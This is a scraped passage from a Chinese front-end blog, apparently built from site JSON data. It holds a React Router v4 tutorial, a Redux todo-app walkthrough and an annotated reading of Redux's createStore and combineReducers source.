page组件 是作为 router 的一部分 12345678910111213141516171819202122232425262728293031// v4import React from \"react\";import &#123; render &#125; from \"react-dom\";import &#123; BrowserRouter, Route, Link &#125; from \"react-router-dom\";const PrimaryLayout = () =&gt; &lt;div className=\"primary-layout\"&gt; &lt;header&gt;Our React Router 4 App&lt;/header&gt; &lt;ul&gt; &lt;li&gt; &lt;Link to=\"/\"&gt;Home&lt;/Link&gt; &lt;/li&gt; &lt;li&gt; &lt;Link to=\"/User\"&gt;User&lt;/Link&gt; &lt;/li&gt; &lt;/ul&gt; &lt;main&gt; &lt;Route path=\"/\" exact component=&#123;HomePage&#125; /&gt; &lt;Route path=\"/user\" component=&#123;UsersPage&#125; /&gt; &lt;/main&gt; &lt;/div&gt;;const HomePage = () =&gt; &lt;h1&gt;Home Page&lt;/h1&gt;;const UsersPage = () =&gt; &lt;h1&gt;User Page&lt;/h1&gt;;const App = () =&gt; &lt;BrowserRouter&gt; &lt;PrimaryLayout /&gt; &lt;/BrowserRouter&gt;;render(&lt;App /&gt;, document.getElementById(\"root\")); 首先，V3 中的 router 不在了，在 V3 中，我们是将整个庞大的router 直接丢给 DOM，而在 V4 中，除了 BrowserRouter， 我们丢给 DOM 的是我们的应用程序本身 V4中，我们不再使用 {props.children} 来嵌套组件了，替代的 &lt;Route&gt;，当 route匹配时，子组件会被渲染到 &lt;Route&gt;书写的地方 基本使用 react-router 4.0 对于接受参数采用 { this.props.match.params.id } 如下例子：&lt;Route path=&quot;list/:id&quot;&gt;&lt;/Router&gt;、 &lt;Link to=&quot;list/123456&quot;&gt;&lt;/Link&gt; 一个完整的嵌套路由的例子 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162// import &#123; Router, Route, Link, Switch &#125; from ‘react-router‘;import &#123; HashRouter, Route, Link, Switch&#125; from ‘react-router-dom‘;class App extends Component &#123; render() &#123; return ( &lt;div&gt; &lt;h1&gt;App&lt;/h1&gt; &lt;ul&gt; &lt;li&gt;&lt;Link to=\"/\"&gt;Home&lt;/Link&gt;&lt;/li&gt; &lt;li&gt;&lt;Link to=\"/about\"&gt;About&lt;/Link&gt;&lt;/li&gt; &lt;li&gt;&lt;Link to=\"/inbox\"&gt;Inbox&lt;/Link&gt;&lt;/li&gt; &lt;/ul&gt; &#123;this.props.children&#125; &lt;/div&gt; ); &#125;&#125;const About = () =&gt; ( &lt;div&gt; &lt;h3&gt;About&lt;/h3&gt; &lt;/div&gt;)const Home = () =&gt; ( &lt;div&gt; &lt;h3&gt;Home&lt;/h3&gt; &lt;/div&gt;)const Message = (&#123; match &#125;) =&gt; ( &lt;div&gt; &lt;h3&gt;new messages&lt;/h3&gt; &lt;h3&gt;&#123;match.params.id&#125;&lt;/h3&gt; &lt;/div&gt;)const Inbox = (&#123; match &#125;) =&gt; ( &lt;div&gt; &lt;h2&gt;Topics&lt;/h2&gt; &lt;Route path=&#123;`$&#123;match.url&#125;/messages/:id`&#125; component=&#123;Message&#125;/&gt; &lt;/div&gt;) ReactDOM.render( (&lt;HashRouter&gt; &lt;App&gt; &lt;Route exact path=\"/\" component=&#123;Home&#125; /&gt; &lt;Route path=\"/about\" component=&#123;About&#125; /&gt; &lt;Route path=\"/inbox\" component=&#123;Inbox&#125; /&gt; &lt;/App&gt; &lt;/HashRouter&gt;), document.getElementById(‘root‘)); 嵌套布局 方式一 1234567891011121314151617const PrimaryLayout = props =&gt; &#123; return ( &lt;div className=\"primary-layout\"&gt; &lt;PrimaryHeader /&gt; &lt;main&gt; &lt;Switch&gt; &lt;Route path=\"/\" exact component=&#123;HomePage&#125; /&gt; &lt;Route path=\"/user\" exact component=&#123;BrowseUsersPage&#125; /&gt; &lt;Route path=\"/user/:userId\" component=&#123;UserProfilePage&#125; /&gt; &lt;Route path=\"/products\" exact component=&#123;BrowseProductsPage&#125; /&gt; &lt;Route path=\"/products/:productId\" component=&#123;ProductProfilePage&#125; /&gt; &lt;Redirect to=\"/\" /&gt; &lt;/Switch&gt; &lt;/main&gt; &lt;/div&gt; );&#125;; userId 通过 props.match.params 获取 props.match 赋予给了 &lt;Route&gt; 中的任何组件。 除此之外，如果组件不通过&lt;Route&gt; 来渲染，要访问 props.match，可以使用 withRouter()高阶组件来实现 方式二 解决了第一种方式中的生命周期，重复渲染的问题 123456789101112131415const PrimaryLayout = props =&gt; &#123; return ( &lt;div className=\"primary-layout\"&gt; &lt;PrimaryHeader /&gt; &lt;main&gt; &lt;Switch&gt; &lt;Route path=\"/\" exact component=&#123;HomePage&#125; /&gt; &lt;Route path=\"/user\" component=&#123;UserSubLayout&#125; /&gt; &lt;Route path=\"/products\" component=&#123;ProductSubLayout&#125; /&gt; &lt;Redirect to=\"/\" /&gt; &lt;/Switch&gt; &lt;/main&gt; &lt;/div&gt; );&#125;; 我们用 2个 routes 替换之前的 4个routes 注意，这里我们没有再使用 exact，因为，我们希望 /user 可以匹配任何以 /user 开始的 route，products 同理 使用这种策略，子布局也开始承担起了渲染 routes 的责任，现在，UserSubLayout 长这样 123456789101112const UserSubLayout = () =&gt; &lt;div className=\"user-sub-layout\"&gt; &lt;aside&gt; &lt;UserNav /&gt; &lt;/aside&gt; &lt;div className=\"primary-content\"&gt; &lt;Switch&gt; &lt;Route path=\"/user\" exact component=&#123;BrowseUsersPage&#125; /&gt; &lt;Route path=\"/user/:userId\" component=&#123;UserProfilePage&#125; /&gt; &lt;/Switch&gt; &lt;/div&gt; &lt;/div&gt;; 但有一点值得注意的是，routes 需要识别它的完整路径才能匹配，为了减少我们的重复输入，我们可以使用 props.match.path来代替 123456789101112131415const UserSubLayout = props =&gt; &lt;div className=\"user-sub-layout\"&gt; &lt;aside&gt; &lt;UserNav /&gt; &lt;/aside&gt; &lt;div className=\"primary-content\"&gt; &lt;Switch&gt; &lt;Route path=&#123;props.match.path&#125; exact component=&#123;BrowseUsersPage&#125; /&gt; &lt;Route path=&#123;`$&#123;props.match.path&#125;/:userId`&#125; component=&#123;UserProfilePage&#125; /&gt; &lt;/Switch&gt; &lt;/div&gt; &lt;/div&gt;; 7、路径参数 有时路径名中存在我们需要获取的参数。例如，在运动员界面，我们需要获取运动员的编号。我们可以向route的路径字符串中添加path参数 如&#39;/roster/:number&#39;中:number这种写法意味着/roster/后的路径名将会被获取并存在match.params.number中。例如，路径名&#39;/roster/6&#39;会获取到一个对象 1&#123; number: '6' &#125; // 注获取的值是字符串类型的 &lt;Player&gt;组件可以使用props.match.params对象来确定需要被渲染的运动员的数据 123456789101112131415// 返回运动员对象的APIimport PlayerAPI from './PlayerAPI'const Player = (props) =&gt; &#123; const player = PlayerAPI.get( parseInt(props.match.params.number, 10) ) if (!player) &#123; return &lt;div&gt;Sorry, but the player was not found&lt;/div&gt; &#125; return ( &lt;div&gt; &lt;h1&gt;&#123;player.name&#125; (#&#123;player.number&#125;)&lt;/h1&gt; &lt;h2&gt;&#123;player.position&#125;&lt;/h2&gt; &lt;/div&gt;) 除了&lt;Player&gt;组件，我们的页面还包含&lt;FullRoster&gt;, &lt;Schedule&gt;以及 &lt;Home&gt;组件 123456789101112131415161718192021222324252627const FullRoster = () =&gt; ( &lt;div&gt; &lt;ul&gt; &#123; PlayerAPI.all().map(p =&gt; ( &lt;li key=&#123;p.number&#125;&gt; &lt;Link to=&#123;`/roster/$&#123;p.number&#125;`&#125;&gt;&#123;p.name&#125;&lt;/Link&gt; &lt;/li&gt; )) &#125; &lt;/ul&gt; &lt;/div&gt;)const Schedule = () =&gt; ( &lt;div&gt; &lt;ul&gt; &lt;li&gt;6/5 @ Evergreens&lt;/li&gt; &lt;li&gt;6/8 vs Kickers&lt;/li&gt; &lt;li&gt;6/14 @ United&lt;/li&gt; &lt;/ul&gt; &lt;/div&gt;)const Home = () =&gt; ( &lt;div&gt; &lt;h1&gt;Welcome to the Tornadoes Website!&lt;/h1&gt; &lt;/div&gt;) 八、inclusive routing 当访问 /user 时，两个组价都会被渲染 1234567891011const PrimaryLayout = () =&gt; &lt;div className=&quot;primary-layout&quot;&gt; &lt;header&gt; Our React Router 4 App &lt;Route path=&quot;/user&quot; component=&#123;UsersMenu&#125; /&gt; &lt;/header&gt; &lt;main&gt; &lt;Route path=&quot;/&quot; exact component=&#123;HomePage&#125; /&gt; &lt;Route path=&quot;/user&quot; component=&#123;UsersPage&#125; /&gt; &lt;/main&gt; &lt;/div&gt;; 九、Exclusive Routing 如果你只想匹配一个 route，那么你也可以使用 &lt;Switch&gt; 来 exclusive routing 123456789101112const PrimaryLayout = () =&gt; &lt;div className=\"primary-layout\"&gt; &lt;PrimaryHeader /&gt; &lt;main&gt; &lt;Switch&gt; &lt;Route path=\"/\" exact component=&#123;HomePage&#125; /&gt; &lt;Route path=\"/user/add\" component=&#123;UserAddPage&#125; /&gt; &lt;Route path=\"/user\" component=&#123;UsersPage&#125; /&gt; &lt;Redirect to=\"/\" /&gt; &lt;/Switch&gt; &lt;/main&gt; &lt;/div&gt;; 在 &lt;Switch&gt; 中只有一个 &lt;Route&gt; 会被渲染，另外，我们还是要给 HomePage所在 &lt;Route&gt;添加 exact，否则，在访问 /user 或 /user/add的时候还是会匹配到 /，从而，只渲染 HomePage 我们将 /user/add放在 /user 前面是保证正确匹配的很有策略性的一步，因为，/user/add会同时匹配 /user和 /user/add 如果我们给每一个 &lt;Route&gt;都添加一个 exact，那就不用考虑上面的 策略 了，但不管怎样，现在至少知道了我们还有其它选择 &lt;Redirect&gt;组件不用多说，执行浏览器重定向，但它在 &lt;Switch&gt; 中时，&lt;Redirect&gt;组件只会在 routes 匹配不成功的情况下渲染 十、Index Routes” 和 “Not Found” V4 中也没有 &lt;IndexRoute&gt;，但 &lt;Route exact&gt;可以实现相同的功能，或者 &lt;Switch&gt;和 &lt;Redirect&gt; 重定向到默认的有效路径，甚至一个找不到的页面 十一、Link 现在，我们应用需要在各个页面间切换。如果使用锚点元素（就是）实现，在每次点击时页面将被重新加载。React Router提供了&lt;Link&gt;组件用来避免这种状况的发生。当你点击&lt;Link&gt;时，URL会更新，组件会被重新渲染，但是页面不会重新加载 123456789101112import &#123; Link &#125; from 'react-router-dom'const Header = () =&gt; ( &lt;header&gt; &lt;nav&gt; &lt;ul&gt; &lt;li&gt;&lt;Link to='/'&gt;Home&lt;/Link&gt;&lt;/li&gt; &lt;li&gt;&lt;Link to='/roster'&gt;Roster&lt;/Link&gt;&lt;/li&gt; &lt;li&gt;&lt;Link to='/schedule'&gt;Schedule&lt;/Link&gt;&lt;/li&gt; &lt;/ul&gt; &lt;/nav&gt; &lt;/header&gt;) &lt;Link&gt;使用&#39;to&#39;参数来描述需要定位的页面。它的值即可是字符串也可是location对象（包含pathname，search，hash与state属性）。如果其值为字符床将会被转换为location对象。 1&lt;Link to=&#123;&#123; pathname: '/roster/7' &#125;&#125;&gt;Player #7&lt;/Link&gt; 十二、Match 正如我们上面看到的那样，props.match 可以帮我们获取 userId 和 routes match 对象为我们提供了 match.params，match.path，和 match.url 等属性 1、match.path vs match.url 最开始，可能觉得这两者的区别并不明显，控制台经常出现相同的输出，比如，访问 /user 1234567891011121314151617const UserSubLayout = (&#123; match &#125;) =&gt; &#123; console.log(match.url) // output: \"/user\" console.log(match.path) // output: \"/user\" return ( &lt;div className=\"user-sub-layout\"&gt; &lt;aside&gt; &lt;UserNav /&gt; &lt;/aside&gt; &lt;div className=\"primary-content\"&gt; &lt;Switch&gt; &lt;Route path=&#123;match.path&#125; exact component=&#123;BrowseUsersPage&#125; /&gt; &lt;Route path=&#123;`$&#123;match.path&#125;/:userId`&#125; component=&#123;UserProfilePage&#125; /&gt; &lt;/Switch&gt; &lt;/div&gt; &lt;/div&gt; )&#125; match 在组件的参数中被解构，意思就是我们可以使用 match.path 代替 props.match.path 虽然我们看不到什么明显的差异，但需要明白的是 match.url 是浏览器 URL 的一部分，match.path 是我们为 router 书写的路径 2、如何选择 如果我们是构建 route 路径，那么肯定使用 match.path 12345678910111213141516const UserComments = (&#123; match &#125;) =&gt; &lt;div&gt; UserId: &#123;match.params.userId&#125; &lt;/div&gt;;const UserSettings = (&#123; match &#125;) =&gt; &lt;div&gt; UserId: &#123;match.params.userId&#125; &lt;/div&gt;;const UserProfilePage = (&#123; match &#125;) =&gt; &lt;div&gt; User Profile: &lt;Route path=&#123;`$&#123;match.url&#125;/comments`&#125; component=&#123;UserComments&#125; /&gt; &lt;Route path=&#123;`$&#123;match.path&#125;/settings`&#125; component=&#123;UserSettings&#125; /&gt; &lt;/div&gt;; 然后，我们按下面方式来访问 12/user/5/comments/user/5/settings 实践后，我们发现，访问 comments 返回 undefined，访问 settings 返回 5 3、避免 Match 冲突 1234567891011121314const UserSubLayou = (&#123; match &#125;) =&gt; &lt;div className=\"user-sub-layout\"&gt; &lt;aside&gt; &lt;UserNav /&gt; &lt;/aside&gt; &lt;div className=\"primary-content\"&gt; &lt;Switch&gt; &lt;Route exact path=&#123;match.path&#125; component=&#123;BrowseUsersPage&#125; /&gt; &lt;Route path=&#123;`$&#123;match.path&#125;/add`&#125; component=&#123;AddUserPage&#125; /&gt; &lt;Route path=&#123;`$&#123;match.path&#125;/:userId/edit`&#125; component=&#123;EditUserPage&#125; /&gt; &lt;Route path=&#123;`$&#123;match.path&#125;/:userId`&#125; component=&#123;UserProfilePage&#125; /&gt; &lt;/Switch&gt; &lt;/div&gt; &lt;/div&gt;; 我们使用 ${match.path}/:userId(\\\\d+)作为 UserProfilePage 对应的 path，保证 :userId 是一个数字，可以避免与 /users/add的冲突，这样，将其所在的 &lt;Route&gt; 丢到最前面去也能正常访问 add 页面 十三、Authorized Route 在应用程序中限制未登录的用户访问某些路由是非常常见的，还有对于授权和未授权的用户 UI 也可能大不一样，为了解决这样的需求，我们可以考虑为应用程序设置一个主入口 1234567891011121314class App extends React.Component &#123; render() &#123;return ( &lt;Provider store=&#123;store&#125;&gt; &lt;BrowserRouter&gt; &lt;Switch&gt; &lt;Route path=\"/auth\" component=&#123;UnauthorizedLayout&#125; /&gt; &lt;AuthorizedRoute path=\"/app\" component=&#123;PrimaryLayout&#125; /&gt; &lt;/Switch&gt; &lt;/BrowserRouter&gt; &lt;/Provider&gt; ) &#125;&#125; 现在，我们首先会去选择应用程序在哪个顶级布局中，比如，/auth/login 和 /auth/forgot-password 肯定在 UnauthorizedLayout 中，另外，当用户登陆时，我们将判断所有的路径都有一个 /app 前缀以确保是否登录。如果用户访问 /app 开头的页面但并没有登录，我们将会重定向到登录页面 十四、&lt;Link&gt; 和之前版本没太大区别，重点看下组件属性 to（string/object）：要跳转的路径或地址； replace（bool）：为 true 时，点击链接后将使用新地址替换掉访问历史记录里面的原地址；为 false 时，点击链接后将在原有访问历史记录的基础上添加一个新的纪录。默认为false 123456789101112131415// Link组件示例// to为string&lt;Link to=\"/about\"&gt;关于&lt;/Link&gt;// to为obj&lt;Link to=&#123;&#123; pathname: '/courses', search: '?sort=name', hash: '#the-hash', state: &#123; fromDashboard: true &#125;&#125;&#125;/&gt;// replace &lt;Link to=\"/courses\" replace /&gt; &lt;NavLink&gt; &lt;NavLink&gt;是&lt;Link&gt; 的一个特定版本, 会在匹配上当前 URL 的时候会给已经渲染的元素添加样式参数，组件属性 activeClassName（string）：设置选中样式，默认值为active； activeStyle（object）：当元素被选中时, 为此元素添加样式； exact（bool）：为 true 时, 只有当地址完全匹配 class 和 style 才会应用； strict（bool）：为 true 时，在确定位置是否与当前 URL 匹配时，将考虑位置 - pathname 后的斜线； isActive（func）：判断链接是否激活的额外逻辑的功能 123456789101112131415161718192021222324252627282930// 用法// activeClassName选中时样式为selected&lt;NavLink to=\"/faq\" activeClassName=\"selected\"&gt;FAQs&lt;/NavLink&gt;// 选中时样式为activeStyle的样式设置&lt;NavLink to=\"/faq\" activeStyle=&#123;&#123; fontWeight: 'bold', color: 'red' &#125;&#125;&gt;FAQs&lt;/NavLink&gt;// 当event id为奇数的时候，激活链接const oddEvent = (match, location) =&gt; &#123; if (!match) &#123; return false &#125; const eventID = parseInt(match.params.eventID) return !isNaN(eventID) &amp;&amp; eventID % 2 === 1&#125;&lt;NavLink to=\"/events/123\" isActive=&#123;oddEvent&#125;&gt;Event 123&lt;/NavLink&gt; 十五、&lt;Switch&gt; 该组件用来渲染匹配地址的第一个&lt;Route&gt;或者&lt;Redirect&gt;。那么它与使用一堆route又有什么区别呢 &lt;Switch&gt;的独特之处是独它仅仅渲染一个路由。相反地，每一个包含匹配地址(location)的&lt;Route&gt;都会被渲染 123456&lt;Switch&gt; &lt;Route exact path=\"/\" component=&#123;Home&#125;/&gt; &lt;Route path=\"/about\" component=&#123;About&#125;/&gt; &lt;Route path=\"/:user\" component=&#123;User&#125;/&gt; &lt;Route component=&#123;NoMatch&#125;/&gt;&lt;/Switch&gt; 现在，如果我们处于/about，&lt;Switch&gt;将开始寻找匹配的&lt;Route&gt;。&lt;Route path=&quot;/about&quot;/&gt; 将被匹配， &lt;Switch&gt;将停止寻找匹配并渲染&lt;About&gt;。同样，如果我们处于/michael，&lt;User&gt;将被渲染 十六、更多参考 https://reacttraining.com/react-router/web/guides/philosophy","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"react","slug":"react","permalink":"https://ru23.com/tags/react/"},{"name":"Router","slug":"Router","permalink":"https://ru23.com/tags/Router/"}]},{"title":"Redux之react结合redux实战篇（十）","slug":"2017-11-redux-study-combine-react-and-redux","date":"2017-11-19T10:40:24.000Z","updated":"2018-10-24T03:46:02.282Z","comments":true,"path":"note/32ffbfbb.html","link":"","permalink":"https://ru23.com/note/32ffbfbb.html","excerpt":"","text":"以TODO为例分析，实际开发中并不是那么简单，下面的原型只是开发中的一个原型，这个简单的例子，有助于掌握数据处理传递的原则。 一、定义constants 这一步不是必须的 1234567891011/** * 常量统一保存，便于管理 */export const ADD_TODO = 'ADD_TODO';export const TOGGLE_TODO = 'TOGGLE_TODO';export const SET_VISIBILITY = 'SET_VISIBILITY';//controll todo wheher show or hideexport const SHOW_ALL = 'SHOW_ALL';export const SHOW_ACTIVE = 'SHOW_ACTIVE';export const SHOW_COMPLETED = 'SHOW_COMPLETED'; 二、定义actionCreator12345678910111213141516171819202122232425/** * 定义action creator */import * as actionType from '../constant/index';let nextTodo = 0;export const addTodo = (text)=&gt;(&#123; type:actionType.ADD_TODO, id:nextTodo++, text&#125;)export const toggleTodo = (id)=&gt;(&#123; type:actionType.TOGGLE_TODO, id&#125;)export const setVisibilityFilter = (filter)=&gt;&#123; return &#123; type:actionType.SET_VISIBILITY, filter &#125;&#125; 三、定义reducer拆分reducer SetVisibility.js 123456789101112131415/** * 处理TODO可见与不可见的reducer */import * as actionType from '../constant/index';// 初始状态是自己设置的 后面的状态会转化// 接收当前状态(设置默认的过滤SHOW_ALL，如设置某些选项卡的active一样)，和action返回新的stateexport const visibilityFilter = (state='SHOW_ALL',action)=&gt;&#123; switch(action.type) &#123; case actionType.SET_VISIBILITY: return action.filter; default: return state; &#125;&#125; addTodo.js 12345678910111213141516171819202122232425/** * 定义处理action的reducers */import * as actionType from '../constant/index';//传入当前的状态空数、actionexport const todos = (state = [],action)=&gt;&#123; switch(action.type)&#123; // 匹配用户触发的actionType case actionType.ADD_TODO: // 合并上一次的状态和当前的状态 返回todos数组 return [ ...state,//把数组展开合并 &#123; id:action.id, text:action.text, completed:false//用户控制TODO是否处于点击完成的状态 默认false 没点击 &#125; ] // TODO列表来回切换 遍历add_todo返回的数组 通过completed来判断 case actionType.TOGGLE_TODO: return state.map(todo=&gt;(todo.id===action.id)?&#123;...todo,completed:!todo.completed&#125;:todo) default: return state;//匹配不到返回state &#125;&#125; 合并reducer 123456789101112/** * 合并reducers */import &#123; combineReducers &#125; from 'redux'import &#123;todos&#125; from './addTodo';import &#123;visibilityFilter&#125; from './SetVisibility';export default combineReducers(&#123; todos, //这些键其实就是被拆分的状态，后面在容器组件中需要通过connect链接 visibilityFilter&#125;); 四、定义store123456789import &#123; applyMiddleware, createStore &#125; from 'redux';import reducer from '../reducers/index';import logger from 'redux-logger';// 创建store 用来存储状态export const store = createStore( reducer, applyMiddleware(logger) //处理日志中间件) 五、结合react-redux 这里忽略展示组件，完成源码看文章结尾 首先我们在container组件中处理好之前分解合并的那些reducer的键，然后在通过connect链接，传递给展示组件的属性使用 容器组件处理 react-todos/src/container/FilterLink.js 12345678910111213141516171819202122232425262728// 处理数组过滤import &#123; connect &#125; from 'react-redux';import Link from '../components/Link';import &#123; setVisibilityFilter &#125; from '../actions/index';// 这里的ownProps指的是 FilterLink// 这里的state其实就是之前分解的todos，visibilityFilterconst mapStateToProps = (state, ownProps) =&gt; &#123; return &#123; active:ownProps.filter === state.visibilityFilter &#125;&#125;/** 如果mapDispatchToProps是一个函数，会得到dispatch和ownProps（容器组件的props对象）两个参数。 */const mapDispatchToProps = (dispatch, ownProps) =&gt; (&#123;// 这里处理对应的事件，传递给展示组件的属性 onClick: () =&gt; &#123; dispatch(setVisibilityFilter(ownProps.filter)) &#125;&#125;)export default connect( mapStateToProps, mapDispatchToProps)(Link); 分析 这里通过connect组件把之前reducer处理的那些状态链接 12345export default combineReducers(&#123; todos, //这些键其实就是被拆分的状态，后面在容器组件中需要通过connect链接 visibilityFilter&#125;); react-todos/src/container/VisibilityTodoList.js 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152/** * 处理可见于不可见组件的逻辑 */import &#123;connect&#125; from 'react-redux';import TodoList from '../components/TodoList';import &#123;toggleTodo&#125; from '../actions/index';import * as actionType from '../constant/index';console.log(toggleTodo)// todos是返回的数组，filter是过滤的选项如SHOW_ALL SHOW_ACTIVE.const getVisibilityTodos = (todos,filter)=&gt;&#123; switch(filter) &#123; case actionType.SHOW_ALL: return todos; case actionType.SHOW_ACTIVE: return todos.filter(t =&gt; !t.completed); case actionType.SHOW_COMPLETED: return todos.filter(t =&gt; t.completed); default: throw new Error('未知的'+filter); &#125;&#125;// 把状态转化为展示组件的属性转递过去/** * * @param &#123;*&#125; state 也就是 * export default CombineReducers(&#123; Todos, SetVisibility *&#125;); * @param &#123;*&#125; ownProps 返回的容器组件本身的参数 如&lt;Filter name=\"poetries\"&gt;此时的ownProps就是name了 */const mapStateToProps = (state) =&gt; &#123; return &#123; todos: getVisibilityTodos(state.todos,state.visibilityFilter), count:state.todos.length &#125;&#125;/** * 如果mapDispatchToProps是一个对象，它的每个键名也是对应 UI 组件的同名参数，键值应该是一个函数，会被当作 Action creator ，返回的 Action 会由 Redux 自动发出 */const mapDispatchToProps = &#123; onTodoClick: toggleTodo&#125;export default connect( mapStateToProps, mapDispatchToProps)(TodoList) react-todos/src/container/addTodos.js 1234567891011121314151617181920/** * Addtodo的处逻辑 */import React, &#123; Component &#125; from 'react';import &#123;addTodo&#125; from '../actions/index';import AddTask from '../components/addTodo';import &#123;connect&#125; from 'react-redux';const mapStateToProps = (state, ownProps) =&gt; (&#123; &#125;)const mapDispatchToProps = &#123; addTodo:addTodo&#125;export default connect( mapStateToProps, mapDispatchToProps)(AddTask); 到此分析完毕，展示组件就不分析了，展示组件本身是没有数据的，需要container处理传递 完整的源码 https://github.com/poetries/react-todos","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://ru23.com/tags/JavaScript/"},{"name":"react","slug":"react","permalink":"https://ru23.com/tags/react/"}]},{"title":"Redux之源码分析（九）","slug":"2017-11-redux-study-source-code-analysis","date":"2017-11-19T09:35:24.000Z","updated":"2018-10-24T03:46:02.284Z","comments":true,"path":"note/d7a0e557.html","link":"","permalink":"https://ru23.com/note/d7a0e557.html","excerpt":"","text":"一、index.js https://github.com/reactjs/redux/blob/master/src/index.js 暴露了几个核心API 12345678910111213import createStore from './createStore';import combineReducers from './utils/combineReducers';import bindActionCreators from './utils/bindActionCreators';import applyMiddleware from './utils/applyMiddleware';import compose from './utils/compose';export &#123; createStore, combineReducers, bindActionCreators, applyMiddleware, compose&#125;; 二、createStore.js https://github.com/reactjs/redux/blob/master/src/createStore.js redux.createStore(reducer, initialState) 传入了reducer、initialState，并返回一个store对象 store对象对外暴露了dispatch、getState、subscribe方法 store对象通过getState() 获取内部状态 initialState为 store 的初始状态，如果不传则为undefined store对象通过reducer来修改内部状态 store对象创建的时候，内部会主动调用dispatch({ type: ActionTypes.INIT });来对内部状态进行初始化。通过断点或者日志打印就可以看到，store对象创建的同时，reducer就会被调用进行初始化 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171import isPlainObject from './utils/isPlainObject';/** * These are private action types reserved by Redux. * For any unknown actions, you must return the current state. * If the current state is undefined, you must return the initial state. * Do not reference these action types directly in your code. */// 初始化的时候(redux.createStore(reducer, initialState)时),传的action.type 就是这货啦export var ActionTypes = &#123; INIT: '@@redux/INIT'&#125;;/** * Creates a Redux store that holds the state tree. * The only way to change the data in the store is to call `dispatch()` on it. * * There should only be a single store in your app. To specify how different * parts of the state tree respond to actions, you may combine several reducers * into a single reducer function by using `combineReducers`. * * @param &#123;Function&#125; reducer A function that returns the next state tree, given * the current state tree and the action to handle. * * @param &#123;any&#125; [initialState] The initial state. You may optionally specify it * to hydrate the state from the server in universal apps, or to restore a * previously serialized user session. * If you use `combineReducers` to produce the root reducer function, this must be * an object with the same shape as `combineReducers` keys. * * @returns &#123;Store&#125; A Redux store that lets you read the state, dispatch actions * and subscribe to changes. */export default function createStore(reducer, initialState) &#123; if (typeof reducer !== 'function') &#123; throw new Error('Expected the reducer to be a function.'); &#125; var currentReducer = reducer; var currentState = initialState; var listeners = []; var isDispatching = false; /** * Reads the state tree managed by the store. * * @returns &#123;any&#125; The current state tree of your application. */ // 这个方法没什么好讲的,返回当前的state function getState() &#123; return currentState; &#125; /** * Adds a change listener. It will be called any time an action is dispatched, * and some part of the state tree may potentially have changed. You may then * call `getState()` to read the current state tree inside the callback. * * @param &#123;Function&#125; listener A callback to be invoked on every dispatch. * @returns &#123;Function&#125; A function to remove this change listener. */ // 很常见的监听函数添加方式,当store.dispatch 的时候被调用 // store.subscribe(listener) 返回一个方法(unscribe),可以用来取消监听 function subscribe(listener) &#123; listeners.push(listener); var isSubscribed = true; return function unsubscribe() &#123; if (!isSubscribed) &#123; return; &#125; isSubscribed = false; var index = listeners.indexOf(listener); listeners.splice(index, 1); &#125;; &#125; /** * Dispatches an action. It is the only way to trigger a state change. * * The `reducer` function, used to create the store, will be called with the * current state tree and the given `action`. Its return value will * be considered the **next** state of the tree, and the change listeners * will be notified. * * The base implementation only supports plain object actions. If you want to * dispatch a Promise, an Observable, a thunk, or something else, you need to * wrap your store creating function into the corresponding middleware. For * example, see the documentation for the `redux-thunk` package. Even the * middleware will eventually dispatch plain object actions using this method. * * @param &#123;Object&#125; action A plain object representing “what changed”. It is * a good idea to keep actions serializable so you can record and replay user * sessions, or use the time travelling `redux-devtools`. An action must have * a `type` property which may not be `undefined`. It is a good idea to use * string constants for action types. * * @returns &#123;Object&#125; For convenience, the same action object you dispatched. * * Note that, if you use a custom middleware, it may wrap `dispatch()` to * return something else (for example, a Promise you can await). */ // 以下情况会报错 // 1. 传入的action不是一个对象 // 2. 传入的action是个对象,但是action.type 是undefined function dispatch(action) &#123; if (!isPlainObject(action)) &#123; throw new Error( 'Actions must be plain objects. ' + 'Use custom middleware for async actions.' ); &#125; if (typeof action.type === 'undefined') &#123; throw new Error( 'Actions may not have an undefined \"type\" property. ' + 'Have you misspelled a constant?' ); &#125; if (isDispatching) &#123; throw new Error('Reducers may not dispatch actions.'); &#125; try &#123; isDispatching = true; // 就是这一句啦, 将 currentState 设置为 reducer(currentState, action) 返回的值 currentState = currentReducer(currentState, action); &#125; finally &#123; isDispatching = false; &#125; // 如果有监听函数,就顺序调用 listeners.slice().forEach(listener =&gt; listener()); // 最后,返回传入的action return action; &#125; /** * Replaces the reducer currently used by the store to calculate the state. * * You might need this if your app implements code splitting and you want to * load some of the reducers dynamically. You might also need this if you * implement a hot reloading mechanism for Redux. * * @param &#123;Function&#125; nextReducer The reducer for the store to use instead. * @returns &#123;void&#125; */ function replaceReducer(nextReducer) &#123; currentReducer = nextReducer; dispatch(&#123; type: ActionTypes.INIT &#125;); &#125; // When a store is created, an \"INIT\" action is dispatched so that every // reducer returns their initial state. This effectively populates // the initial state tree. // // redux.createStore(reducer, initialState) 的时候, 内部会 自己调用 dispatch(&#123; type: ActionTypes.INIT &#125;); // 来完成state的初始化 dispatch(&#123; type: ActionTypes.INIT &#125;); // 返回的就是这个东东了,只有四个方法 return &#123; dispatch, subscribe, getState, replaceReducer &#125;;&#125; 三、combineReducers.js https://github.com/reactjs/redux/blob/master/src/combineReducers.js redux.combineReducers(reducerMap) 的作用在于合并多个reducer函数，并返回一个新的reducer函数。因此可以看到，combineReducers 返回了一个函数，并且该函数的参数同样是state、reducer 最终 store.getState()返回的state，大概会是这么个样子{todos: xx, filter: xx}。简单的说，state被拆分成了两份，TodoReducer的返回值赋值给了state.todos，FilterReducer的返回值赋值给了state.filter 1234567function TodoReducer(state, action) &#123;&#125;function FilterReducer(state, action) &#123;&#125;var finalReducers = redux.combineReducers(&#123; todos: TodoReducer, filter: FilterReducer&#125;); combineReducers(reducerMap) 传入一个对象，并返回一个全新的reducer。调用方式跟跟普通的reducer一样，也是传入state、action 通过combineReducers，对 store 的状态state进行拆分 reducerMap的key，就是 state 的key，而 调用对应的reducer返回的值，则是这个key对应的值。如上面的例子，state.todos == TodoReducer(state, action) redux.createStore(finalReducers, initialState) 调用时，同样会对 